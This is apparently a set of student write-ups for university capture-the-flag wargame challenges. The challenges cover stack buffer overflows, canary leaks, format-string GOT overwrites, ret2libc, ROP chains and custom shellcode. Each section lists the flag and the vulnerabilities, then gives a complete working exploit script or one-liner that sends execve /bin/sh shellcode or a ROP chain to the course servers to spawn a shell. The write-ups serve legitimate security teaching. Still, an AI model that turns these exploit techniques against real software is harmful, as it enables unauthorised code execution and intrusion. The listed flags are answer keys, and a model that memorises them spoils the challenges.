buffer-4 | shellz
===========================

Flag: `6447{1849748d-6e69-4bca-ab03-67b0778ef9bb}`

General overview of problems faced
-------------------------------------
My first approach was to bruteforce the aslr since the buffer is 8kb which worked after about 2000 runs but I then realised it was easier to simply use rop to call eax which contained the buffer and therefore be able to execute the buffer on every run

List of vulnerabilities
--------------------
1. The stack is executable
2. Input is taking using `gets` and the buffer is of fixed sized therefore a user can overflow the buffer and overwrite anything after it

Steps to exploit
------------------
1. Send your shellcode + enough padding so that the length of your shellcode + the padding = 8204
2. Send the address 0x08048406 in little endian format
3. You now have a shell


Script/Command used
------------------
```bash
(python -c 'print "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68" + "A"*(8204-46) + "\x06\x84\x04\x08"'; cat - ) | nc wargames.6447.sec.edu.au 5004
```

==============================
==============================

canary-3 | stack-dump
===========================

Flag: `6447{31c83bef-e49b-4104-bdeb-bae408e8ef84}`

General overview of problems faced
-------------------------------------
N/A

List of vulnerabilities
--------------------
1. The program lists information about a memory pointer on the stack at esp+35
2. Arbitrary memory can be printed use the program by inputing the address to where you want to read. This allows a user to leverage the previous vulnerability in order to calculate the address pointer to the canary and read the canary.
3. The program uses a fixed buffer with gets to take input when requesting "option a". This means a user can overflow the buffer and overflow the return address of the main function.
4. It is also possible to exploit the "len input" which is then converted into an "int" and then passed as argument to the fread function. No length check is made, therefore the user could request 10000 bytes of input and it would allow you to 'fread' 10000 bytes of input into a fixed a size buffer...


Steps to exploit
------------------
1. Use the given address to calculate the canary address. The given pointer is at esp+35 and the canary is at esp+140, therefore we need to add 105 to the given address.
2. Input the calculated canary address. (option "a" in the main menu of the program)
3. Get the program to print out the value at the canary address (option "b" in the main menu)
4. Save the 4 bytes of canary
5. Select option "a" and input 96 bytes of data, then input the canary value, add 12 bytes of offset data and then input the address of the win function in little endian format
6. Select option "q" from the main menu.
7. Congratz you now have a shell

Script/Command used
------------------
```python
#!/usr/bin/env python
# -*- encoding: utf-8 -*-

from pwn import *

NOP_OPERATOR = '\x90'

def main():
    r = remote("wargames.6447.sec.edu.au", 6003)

    r.recvuntil("a useful stack pointer ")
    base_pointer = int(r.recvline().strip(), 16)
    canary_pointer = base_pointer + 105

    r.sendline('a')
    r.sendline('4')
    r.sendline(p32(canary_pointer))

    r.recvrepeat(0.2)

    r.sendline('b')
    canary = r.recvline().strip()[22:26]
    print canary


    buf_len = 140-44 # 140 (esp+140 = canary || esp+44 = start of "len" buffer)
    win = 0x80486cd
    offset = 12 # 0xffffd5bc - 0xffffd5cc = -16 (12 offset to ret + 4 canary)

    r.sendline('a')
    r.sendline(
        NOP_OPERATOR * buf_len
        + str(canary)
        + NOP_OPERATOR * offset
        + p32(win)
    )

    r.sendline('d') # quit the program and trigger the jump

    r.interactive()

if __name__ == '__main__':
    main()
```

==============================
==============================

format-3 | sploitwarz
===========================

Flag: `6447{4ee67e05-ec23-4d7a-9b12-b17a3b251656}`

General overview of problems faced
-------------------------------------
Wrote a function to dynamically calculate the offset because aslr moves the win function address around

List of vulnerabilities
--------------------
1. The name buffer is used in a `printf` without formating after doing a successfull gamble

Steps to exploit the format string
------------------
1. Set your name to "%3$p"
2. Gamble and win. The odd one out is the non-fibonnaci number
3. Save the printed address and add 14172 to find the printf address in the got table. Remove -2883 to find the win function address
4. Set your name to : printf_address + (printf_address + 1) + (printf_address + 2) + (printf_address + 3) + '%{p1}c%9$hhn%{p2}c%10$hhn%{p3}c%11$hhn%{p4}c%12$hhn' where p1, p2, p3, p4 represent each byte of the win function address
5. Gamble and win.

Script/Command used
------------------
```python
#!/usr/bin/env python
# -*- encoding: utf-8 -*-

from pwn import *


def get_fib_sequence():
    prev = 0
    curr = 1
    ret = [prev, curr]

    for i in range(1, 25):
        temp = curr
        curr = prev+curr
        prev = temp
        ret += [curr]
    return ret


def get_wrong(l):
    fibs = get_fib_sequence()
    for i, dig in enumerate(l):
        if int(dig) not in fibs:
            return i
    return 0


def do_change_name(r, new_name):
    r.sendline('c')
    r.sendline(new_name)


def do_gamble(r):
    r.sendline('g')
    r.sendline('0.0000000001')
    r.recvuntil('Pick the odd one out:')
    resp = r.recvrepeat(0.2)
    resp = resp.split('\n')
    resp = [a[3:] for a in resp if a[3:]]

    print resp, get_wrong(resp)

    wrong = get_wrong(resp)
    r.sendline(str(wrong+1))
    r.recvuntil("Well done, ")
    resp = r.recvline()
    r.sendline()
    resp = resp.split('!')

    return resp[0]


def calculate_value(a, b):
    tmp = abs(a-b)
    if a > b:
        return 0x100-tmp
    return tmp


def main():
    target = "wargames.6447.sec.edu.au"
    port = "7003"

    r = remote(target, port)

    r.sendline('%3$p')
    resp = do_gamble(r)
    print "recovered address = ", resp
    win = int(resp, 16) - 2883
    target = win + 14172
    win = hex(win)

    win = [int(win[i:i+2], 16) for i in range(2, len(win), 2)][::-1]

    payload = (
        p32(target)
        + p32(target + 1)
        + p32(target + 2)
        + p32(target + 3)
        + '%{}c%9$hhn%{}c%10$hhn%{}c%11$hhn%{}c%12$hhn'.format(
            win[0] - 16,
            calculate_value(win[0], win[1]),
            calculate_value(win[1], win[2]),
            calculate_value(win[2], win[3])
        )
    )

    print payload

    do_change_name(r, payload)

    resp = r.recvrepeat(0.2)
    print resp
    resp = do_gamble(r)
    print resp


if __name__ == '__main__':
    main()
```

==============================
==============================

nx-1 | piv_it
===========================

Flag: `6447{38b126bc-24b0-404d-81db-7a2f74ea4941}`

General overview of problems faced
-------------------------------------
- The postamble was very confusing with esp being moved multiple times from multiple registers
- had to test which libc version was being used as there were 2 possible libc versions available based on the infoleak

List of vulnerabilities
--------------------
1. Infoleak: we are given the address to the `printf` function
2. Buffer overflow: The program uses `read` to take up to 52 bytes of input into a fixed length buffer which is smaller than 52 bytes. Therefore we can overflow the buffer and overwrite memory after it.

Steps to exploit
------------------
1. Record the `printf` address pointer
2. Use a libc database to find which libc library is being used and using the given offsets, calculate the system address and the "/bin/sh" string address. (if there are 2 choices, select the ubuntu10 version)
3. Send as a payload:
    - the address 0x08048199 in little endian format 34 times
    - the calculated system address
    - 4 bytes to replace return address
    - the calcuated "/bin/sh" address
    - 1 random char to redirect esp into your buffer
4. Because of aslr, you might need to repeat the process multiple times
5. Congratulations you now have a shell

Script/Command used
------------------
```python
#!/usr/bin/env python
# -*- encoding: utf-8 -*-

from pwn import *

def main():
    context.terminal = "/bin/sh"
    h = "wargames.6447.sec.edu.au"
    p = 8001

    ret_address = 0x08048199
    r_char = "\x00" # use a semi-random char and hope aslr treats you well

    i = 0
    while 1:
        i += 1
        print i

        r = remote( h, p )

        r.recvuntil("random number: ")
        resp = r.recvline().strip()
        print resp

        printf_address = int(resp, 16)
        system_address = printf_address - 0xe8d0
        bin_sh_string_add = printf_address + 0x11239b

        payload = p32(ret_address) * 34 + p32(system_address) + p32(bin_sh_string_add) * 2 + r_char

        r.send(payload)
        resp = r.recvrepeat(0.4)
        print resp

        r.interactive()
        r.close()

if __name__ == '__main__':
    main()
```


==============================
==============================

nx-2 | roproprop
===========================

Flag: `6447{1403f546-2002-4f3a-8da7-13493dc643b7}`

General overview of problems faced
-------------------------------------
- The function post-amble in this case was confusing as it was moving the stack around between multiple registers/addresses
- Had to use a libc database search to find the libc version used and calculate corresponding offset

List of vulnerabilities
--------------------
1. Infoleak: we are given the address to the `puts` function
2. Buffer overflow: The program uses `gets` to take input into a fixed length buffer

Steps to exploit
------------------
1. Record the `puts` address pointer
2. Use a libc database to find which libc library is being used and using the given offsets, calculate the system address and the "/bin/sh" string address
3. Send as a single payload:
    - 1 byte to fix offset
    - the address 0x08048331 in little endian format 331 times
    - the calculated system address
    - 4 bytes to replace return address
    - the calculated "/bin/sh" address
4. Congratulations you now have a shell

Script/Command used
------------------
```python
#!/usr/bin/env python
# -*- encoding: utf-8 -*-

from pwn import *

r = remote("wargames.6447.sec.edu.au", 8002)

r.recvuntil("number:")
resp = r.recvline().strip()
print resp

puts_address = int(resp, 16)
system_address = puts_address - 0x24f00
bin_sh_address = puts_address + 0xfbd6b

print hex(system_address)
print hex(bin_sh_address)

ret_rop_gadget = 0x08048331

r.sendline("A" + p32(ret_rop_gadget) * 331 + p32(system_address) + "BBBB" + p32(bin_sh_address))

r.interactive()
```


==============================
==============================

nx-3 | swrop
===========================

Flag: `6447{1feda6d2-8033-4c40-86cb-f46c2ad98888}`

General overview of problems faced
-------------------------------------
I was using wrong address to point to bin/bash

List of vulnerabilities
--------------------
1. The program uses a `read` function call and allows up to 256 bytes to be written but the buffer being written to is less than 256 therefore the buffer can be overflown. We can use ret to libc to get a shell

Steps to exploit
------------------
1. Send 140 bytes of padding + address to `call system` in little endian format ("\x90\x83\x04\x08") + a fake return address + the address to bin/bash ("\x00\x86\x04\x08")


Script/Command used
------------------
```bash
(python -c 'print "A"*140 + "\x90\x83\x04\x08" + "BBBB" + "\x00\x86\x04\x08"'; cat - ) | nc wargames.6447.sec.edu.au 8003
```


==============================
==============================

nx-4 | static
===========================

Flag: `6447{698fe9fd-1c5e-4992-b2c0-6df10e7e718a}`

General overview of problems faced
-------------------------------------
Learned to used ropper in order to create a rop-chain

List of vulnerabilities
--------------------
1. The program uses `gets` in order to take input into a fixed sized buffer

Steps to exploit
------------------
1. Use ROPgadget to create a ropchain by running `ROPgadget --binary static --ropchain`
2. Send 12 bytes of padding followed by your rop chain

Script/Command used
------------------
```python
#!/usr/bin/env python
# -*- encoding: utf-8 -*-
from pwn import *
from struct import pack

# flag : 6447{698fe9fd-1c5e-4992-b2c0-6df10e7e718a}

def main():
    t = "wargames.6447.sec.edu.au"
    h = "8004"

    r = remote(t, h)

    padding = 12

    p = 'A' * padding

    p += pack('<I', 0x0806eada) # pop edx ; ret
    p += pack('<I', 0x080ea060) # @ .data
    p += pack('<I', 0x080bb236) # pop eax ; ret
    p += '/bin'
    p += pack('<I', 0x0809a54d) # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x0806eada) # pop edx ; ret
    p += pack('<I', 0x080ea064) # @ .data + 4
    p += pack('<I', 0x080bb236) # pop eax ; ret
    p += '//sh'
    p += pack('<I', 0x0809a54d) # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x0806eada) # pop edx ; ret
    p += pack('<I', 0x080ea068) # @ .data + 8
    p += pack('<I', 0x080543e0) # xor eax, eax ; ret
    p += pack('<I', 0x0809a54d) # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x080481c9) # pop ebx ; ret
    p += pack('<I', 0x080ea060) # @ .data
    p += pack('<I', 0x0806eb01) # pop ecx ; pop ebx ; ret
    p += pack('<I', 0x080ea068) # @ .data + 8
    p += pack('<I', 0x080ea060) # padding without overwrite ebx
    p += pack('<I', 0x0806eada) # pop edx ; ret
    p += pack('<I', 0x080ea068) # @ .data + 8
    p += pack('<I', 0x080543e0) # xor eax, eax ; ret
    p += pack('<I', 0x0807b52f) # inc eax ; ret
    p += pack('<I', 0x0807b52f) # inc eax ; ret
    p += pack('<I', 0x0807b52f) # inc eax ; ret
    p += pack('<I', 0x0807b52f) # inc eax ; ret
    p += pack('<I', 0x0807b52f) # inc eax ; ret
    p += pack('<I', 0x0807b52f) # inc eax ; ret
    p += pack('<I', 0x0807b52f) # inc eax ; ret
    p += pack('<I', 0x0807b52f) # inc eax ; ret
    p += pack('<I', 0x0807b52f) # inc eax ; ret
    p += pack('<I', 0x0807b52f) # inc eax ; ret
    p += pack('<I', 0x0807b52f) # inc eax ; ret
    p += pack('<I', 0x080493e1) # int 0x80

    r.sendline(p)
    r.interactive()

if __name__ == "__main__":
    main()
```


==============================
==============================

misc-1 | simple
===========================

Flag: `6447{916709a2-490a-4ee1-b631-62452673a148}`

General overview of problems faced
-------------------------------------
Learned how to write and convert shellcode using pwntools

List of vulnerabilities
--------------------
1. The stack is executable
2. The program executes the code in your buffer by loading the buffer into eax and executing `call eax` which allows the user to input malicious code

Steps to exploit
------------------
1. Generate assembly code to read from file handler 1000 into esp and read 42 bytes of text
2. Generate assembly code to write to STDOUT (fh = 1) and write 42 bytes.
3. Convert the assembly code to hex. A valid payload is "\x31\xdb\x66\xbb\xe8\x03\x89\xe1\x6a\x2a\x5a\x6a\x03\x58\xcd\x80\x6a\x01\x5b\x89\xe1\x6a\x2a\x5a\x6a\x04\x58\xcd\x80"
4. Send the payload and receive the flag

Script/Command used
------------------
```python
#!/usr/bin/env python
# -*- encoding: utf-8 -*-

# Flag: 6447{916709a2-490a-4ee1-b631-62452673a148}

from pwn import *

context.arch = 'i386'

r = remote("misc.6447.sec.edu.au", 8005)

payload = shellcraft.read(1000, 'esp', 42)
payload += shellcraft.write(1, 'esp', 42)

asm_payload = asm(payload)
r.sendline(asm_payload)

print "Flag:", r.recvrepeat(0.2).split()[-1]
```

============================================
============================================

misc-2 | egg
===========================

Flag: `6447{16baa76c-2d52-4972-be1b-d8b600e2c335}`

General overview of problems faced
-------------------------------------
Had forgotten that calling a function added a return address to the stack and therefore moved the buffers esp offsets

List of vulnerabilities
--------------------
1. The stack is executable
2. The program executes the code in a small buffer by loading the buffer into eax and executing `call eax` which allows the user to input malicious code. Even if the first buffer is too small to execute malicious commands, it is possible to jump to the bigger buffer in order to execute a large payload.

Steps to exploit
------------------
1. Write the small buffer's assembly code to call [esp + 60] which contains the large buffer
2. Write the large buffer's assembly code to read 42 bytes from filehandle 1000 into esp and write 42 bytes from esp to STDOUT
3. Convert the assembly code to hex and send the small buffer then the big buffer. The flag will then be printed out.


Script/Command used
------------------
```python
#!/usr/bin/env python
# -*- encoding: utf-8 -*-

# flag: 6447{16baa76c-2d52-4972-be1b-d8b600e2c335}

from pwn import *

def generate_small_payload():
    payload = "mov eax, [esp+60];"
    payload += "call eax;"

    asm_payload = asm(payload)

    return asm_payload

def generate_large_payload():
    big_payload = shellcraft.read(1000, 'esp', 42)
    big_payload += shellcraft.write(1, 'esp', 42)

    return asm(big_payload)

def main():
    context.arch = 'i386'
    context.terminal = '/bin/sh'

    r = remote("misc.6447.sec.edu.au", 8006)

    r.sendline(generate_small_payload())
    r.sendline(generate_large_payload())

    print "Flag:", r.recvrepeat(0.2).split()[-1]

if __name__ == '__main__':
    main()
```
